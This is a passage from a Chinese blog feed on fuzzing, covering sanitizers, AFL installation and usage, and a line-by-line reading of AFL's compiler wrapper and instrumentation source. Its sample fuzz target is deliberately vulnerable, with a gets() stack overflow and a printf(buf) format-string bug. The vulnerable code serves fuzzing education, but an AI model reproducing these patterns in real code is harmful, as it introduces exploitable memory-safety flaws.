的帮助下，进行分析。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">什么是<span class="hljs-variable">Sanitizer</span>？<br><span class="hljs-variable">Sanitizer</span>是由 <span class="hljs-variable">Google</span> 研发团队提出的用于检测 <span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">++</span> 程序常见内存错误的工具集<br>其中包含：<br><span class="hljs-variable">AddressSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">asan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测内存访问错误，即发现程序访问了不该访问的内存，就会记录错误；<br><span class="hljs-variable">LeakageSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">lsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>内存泄露检测；<br><span class="hljs-variable">MemorySanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">msan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检查读取未初始化的内存错误；<br><span class="hljs-variable">ThreadSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">tsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测数据竞争与死锁；<br><span class="hljs-variable">UndefinedBehaviorSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">ubsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测未定义的操作。<br></code></pre></td></tr></table></figure><p><strong>Key questions</strong></p><ul><li>How to get initial inputs ?<ul><li>提供格式良好的 inputs ；</li><li>良好的 inputs 可以适应许多格式复杂的文件 ；</li><li>能探入更深层次路径的 inputs ；</li><li>可复用</li></ul></li><li>How to generate testcases ?</li><li>How to select seed from the pool ?<ul><li>covering more code and be more likely to trigger vulnerabilities;</li><li>reduce the waste of repeatedly execution of paths and save computing resource</li></ul></li><li>How to efficiently test applications?<ul><li>forkserver </li></ul></li></ul><h2 id="4-Techniques-integrated-in-fuzzing"><a href="#4-Techniques-integrated-in-fuzzing" class="headerlink" title="4.Techniques integrated in fuzzing"></a>4.Techniques integrated in fuzzing</h2><ul><li>污点分析;</li><li>利用AI生成、检测好的seed，使之符合格式;</li><li>Intel PT;</li></ul><h2 id="5-Fuzzing-towards-different-applications"><a href="#5-Fuzzing-towards-different-applications" class="headerlink" title="5.Fuzzing towards different applications"></a>5.Fuzzing towards different applications</h2><ul><li>File format fuzzing;<ul><li>Peach;</li><li>on web browsers;</li></ul></li><li>Kernel fuzzing;</li><li>Fuzzing of protocols;</li></ul><h2 id="6-New-trends-of-fuzzing"><a href="#6-New-trends-of-fuzzing" class="headerlink" title="6.New trends of fuzzing"></a>6.New trends of fuzzing</h2><ul><li>Smart fuzzing;</li><li>New techniques;<ul><li>machine learning;</li></ul></li><li>new system features and hardware features;</li></ul><h2 id="7-Conclusion"><a href="#7-Conclusion" class="headerlink" title="7.Conclusion"></a>7.Conclusion</h2><p>Fuzzing是目前最为有效且效率高的漏洞发掘方式，本文对比了Fuzzing与其他技术的差别，总结了Fuzzing中综合的技术，最后展望了能让Fuzzing更为高效的未来技术。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing</title>
    <link href="/2023/02/19/Fuzzing/"/>
    <url>/2023/02/19/Fuzzing/</url>
    
    <content type="html"><![CDATA[<h1 id="初探Fuzz"><a href="#初探Fuzz" class="headerlink" title="初探Fuzz"></a>初探Fuzz</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官网下载<br><a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a><br>然后安装<br><code>tar zxvf afl-2.52b.tgz</code><br><code>make</code><br><code>sudo make install</code><br>安装结束</p><h3 id="初步使用AFL"><a href="#初步使用AFL" class="headerlink" title="初步使用AFL"></a>初步使用AFL</h3><p>样例程序（靶）</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;it is good!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<span class="hljs-comment">//存在栈溢出漏洞</span><br>    <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//存在格式化字符串漏洞</span><br>    <span class="hljs-built_in">vuln</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">afl-gcc -g -o afl_test afl_test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h3 id="建立读入、输出文件夹"><a href="#建立读入、输出文件夹" class="headerlink" title="建立读入、输出文件夹"></a>建立读入、输出文件夹</h3><p>如fuzz_in,fuzz_out</p><h3 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h3><p><code>afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</code><br>接下来会报错<br><code> Pipe at the beginning of &#39;core_pattern&#39;</code><br>进行设置<br><code>sudo su</code><br><code> echo core &gt;/proc/sys/kernel/core_pattern</code><br>再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test<br></code></pre></td></tr></table></figure><p>即可进入AFL仪表盘</p><h3 id="AFL-仪表盘"><a href="#AFL-仪表盘" class="headerlink" title="AFL 仪表盘"></a>AFL 仪表盘</h3><p><img src="/2023/02/19/Fuzzing/afl_ui.png" alt="AFL仪表盘"></p><p>关注<br><code>stage progress </code><br>若exec speed 低于600，则速度太慢<br><code> unique crashes</code><br>发现的路径数</p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><p><code> Ctrl+C</code><br>结束运行<br>进入fuzz_out<br>输入<code>xxd id:.........</code><br>查看结果，并分析</p><h1 id="AFL源码分析"><a href="#AFL源码分析" class="headerlink" title="AFL源码分析"></a>AFL源码分析</h1><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><p><strong>afl-gcc.c</strong>是封装（wrapper）了gcc的一个文件<br>afl-gcc会寻找、配置环境变量以及许多配置数据。<br><strong>变量：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span> as的路径，接下来的函数find_as就是为了确定这个参数<br><span class="hljs-type">static</span> u8** cc_params;              <span class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br>            <br></code></pre></td></tr></table></figure><p><strong>函数  find_as(u8* argv0):</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_as</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>); <span class="hljs-comment">//getenv()函数，直接寻找环境变量中有无目标值，有就以字符串+null形式返回，无则直接返回null</span><br>  u8 *slash, *tmp;<span class="hljs-comment">// slash 斜杠 “\”  </span><br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/as&quot;</span>, afl_path);<span class="hljs-comment">//将找到的路径与/as拼接，尝试找到目标程序</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123; <span class="hljs-comment">// access()函数会尝试运行目标程序，成功返回值为0，否则返回-1，本句意为若通过环境变量找到了as，就...</span><br>      as_path = afl_path;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//找到最后一次出现字符&#x27;/&#x27;的位置并返回之</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//若找到&#x27;/&#x27;</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<span class="hljs-comment">//argv0是int main(int argc, char**argv)的第一个参数</span><br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-as&quot;</span>, dir);<span class="hljs-comment">//拼接运行时给入的地址与as</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123;<br>      as_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/as&quot;</span>, X_OK)) &#123;<br>    as_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);<span class="hljs-comment">//若找不到as，抛出错误</span><br> <br>&#125;<br></code></pre></td></tr></table></figure><p>即本函数是寻找assembler的过程，没找到就报错</p><p><strong>函数edit_params</strong></p><ul><li>该函数将arvg[0]中的最后’&#39;后的字符串赋给name，根据一系列判断，确定’afl-lang’ or ‘afl-lang++’ or 其他平台，如APPLE等。</li><li>即读取第一个参数，然后确定平台、方式</li><li>随后进入while循环，读取argv[1]开始的参数</li><li>若为’-B’，提示<code>&quot;-B is already set, overriding&quot;</code></li><li>若为’-integrated-as’，略过</li><li>等等</li></ul><p><strong>离开while循环后</strong><br>若为<code>clang_mode</code>，设置<code>cc_params[cc_par_cnt++] = &#39;-no-integranted-as&#39;;</code><br>如果存在环境变量 <code>AFL_HARDEN</code>，则设置<code>-fstack-protector-all</code>。且如果没有设置<code> fortify_set</code> ，追加<code>-D_FORTIFY_SOURCE=2</code></p><p>之后还要一系列参数设置<br>总而言之，该函数是为了将参数设置好，符合运行环境以及指令。</p><p><strong>main函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span><br>         <span class="hljs-string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span><br>         <span class="hljs-string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span><br>         <span class="hljs-string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span><br>         <span class="hljs-string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,<br>         BIN_PATH, BIN_PATH);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  find_as(argv[<span class="hljs-number">0</span>]);<br><br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<span class="hljs-comment">//调用以上两个函数，完成配置</span><br><br>  FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p><strong>参数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8** as_params;          <span class="hljs-comment">/* Parameters passed to the real &#x27;as&#x27;   */</span> <span class="hljs-comment">// 传给as的参数</span><br><br><span class="hljs-type">static</span> u8*  input_file;         <span class="hljs-comment">/* Originally specified input file      */</span><br><span class="hljs-type">static</span> u8*  modified_file;      <span class="hljs-comment">/* Instrumented file for the real &#x27;as&#x27;  */</span> <span class="hljs-comment">//as进行插桩的文件</span><br><br><span class="hljs-type">static</span> u8   be_quiet,           <span class="hljs-comment">/* Quiet mode (no stderr output)        */</span><br>            clang_mode,         <span class="hljs-comment">/* Running in clang mode?               */</span><br>            pass_thru,          <span class="hljs-comment">/* Just pass data through?              */</span><br>            just_version,       <span class="hljs-comment">/* Just show version?                   */</span><br>            sanitizer;          <span class="hljs-comment">/* Using ASAN / MSAN                    */</span><br><br><span class="hljs-type">static</span> u32  inst_ratio = <span class="hljs-number">100</span>,   <span class="hljs-comment">/* Instrumentation probability (%)      */</span>  <span class="hljs-comment">// 插桩覆盖率</span><br>            as_par_cnt = <span class="hljs-number">1</span>;     <span class="hljs-comment">/* Number of params to &#x27;as&#x27;             */</span><br></code></pre></td></tr></table></figure><p><strong>函数edit_params</strong><br>同afl-gcc中一致，进行参数配置</p><p><strong>函数add_instrumentation</strong><br>插桩函数，此函数负责处理输入文件，生成<code>modified_file</code>，将instrumentations插入所有适当位置。</p><ul><li><p>读取input-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (input_file) &#123;<br><br>    inf = fopen(input_file, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!inf) PFATAL(<span class="hljs-string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<br><br>  &#125; <span class="hljs-keyword">else</span> inf = <span class="hljs-built_in">stdin</span>;<br>  <span class="hljs-comment">//若打开失败，报错无法读取，或直接从stdin读取</span><br></code></pre></td></tr></table></figure></li><li><p>写入modified-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="hljs-number">0600</span>);<br><br><span class="hljs-keyword">if</span> (outfd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);<br><br>outf = fdopen(outfd, <span class="hljs-string">&quot;w&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!outf) PFATAL(<span class="hljs-string">&quot;fdopen() failed&quot;</span>); <br></code></pre></td></tr></table></figure><p>接下来看看下一段</p></li></ul><p><strong>真正有趣的地方，插桩逻辑开始之处</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* All right, this is where the actual fun begins. For one, we only want to</span><br><span class="hljs-comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span><br><span class="hljs-comment">       files - and let&#x27;s set instr_ok accordingly. */</span><br><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br><br>      <span class="hljs-comment">/* OpenBSD puts jump tables directly inline with the code, which is</span><br><span class="hljs-comment">         a bit annoying. They use a specific format of p2align directives</span><br><span class="hljs-comment">         around them, so we use that as a signal. */</span><br><br>      <span class="hljs-keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;p2align &quot;</span>, <span class="hljs-number">8</span>) &amp;&amp;<br>          <span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">10</span>]) &amp;&amp; line[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>) skip_next_label = <span class="hljs-number">1</span>;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;text\n&quot;</span>, <span class="hljs-number">5</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t.text&quot;</span>, <span class="hljs-number">13</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t__TEXT,__text&quot;</span>, <span class="hljs-number">21</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section __TEXT,__text&quot;</span>, <span class="hljs-number">21</span>)) &#123;<br>        instr_ok = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">continue</span>; <br>      &#125;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t&quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section &quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;bss\n&quot;</span>, <span class="hljs-number">4</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;data\n&quot;</span>, <span class="hljs-number">5</span>)) &#123;<br>        instr_ok = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>由于插桩只向<code>.text</code>部分插入，故需要进行该部分的匹配（确认是否在此部分中）</li><li>即匹配<code>text   section\t.text </code>等四个str，若匹配成功，<code>continue</code>跳出，进行下一次循环</li><li>若匹配失败，再与非.text字段进行匹配，若匹配成功，证明不在.text段内，也<code>continue</code>跳出</li><li>上述两种情况，参数<code>instr_ok</code>分别为1、0，即代表是否位于理想字段内。</li></ul><p>后续进行三个判定，来确认一些参数的值。</p><ul><li>插桩时关注的重点是<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">^main:      - function entry point (always <span class="hljs-keyword">instrumented)</span><br><span class="hljs-keyword"></span>         ^.L0:       - GCC <span class="hljs-keyword">branch </span>label<br>         ^.<span class="hljs-keyword">LBB0_0: </span>  - clang <span class="hljs-keyword">branch </span>label (<span class="hljs-keyword">but </span>only in clang mode)<br>         ^\tjnz foo  - conditional <span class="hljs-keyword">branches</span><br></code></pre></td></tr></table></figure>故检测形如<code>\tj[^m]</code>的格式的命令，即为条件跳转命令。当随机数小于覆盖率时，会将<code>trampoline_fmt_64</code>写入<code>R(MAP_SIZE)</code>位进入文件，随后插桩计数<code>ins_lines</code>加一，continue跳出。<br>对于clang，APPLE是相似的过程，即适用于不同编译系统</li></ul><p>最后回到while循环的开始处<br>从刚刚就一直困扰我的问题——判断条件合适（位于.text中），却跳转进下一个循环是为什么，得到了解决。<br>可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;<br>        instrument_next &amp;&amp; line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; <span class="hljs-built_in">isalpha</span>(line[<span class="hljs-number">1</span>])) &#123;<br><br>      <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>              R(MAP_SIZE));<br><br>      instrument_next = <span class="hljs-number">0</span>;<br>      ins_lines++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>循环开始时便进行了一次条件检测，当合适时，进行插桩，再重新布置参数，使得不漏一处。</p><p><strong>至此，插桩的逻辑基本完成。</strong><br><strong>总结：插桩是通过遍历目标文件行，寻找敏感处并进行标记，于本次循环或下次循环进行插桩，然后再去寻找下处可插处，直至lines遍历完毕</strong></p><h2 id="afl-as-h"><a href="#afl-as-h" class="headerlink" title="afl-as.h"></a>afl-as.h</h2><p>上面读了两个文件中描述了插桩过程的逻辑，其中真正的插桩，<code>trampoline_fmt_64/32</code>是关键所在（插入了什么内容？）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs trampoline_fmt_64/32```定义于```afl-as.h```中，以下是其代码">```c<br>static const u8* trampoline_fmt_32 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;<br>  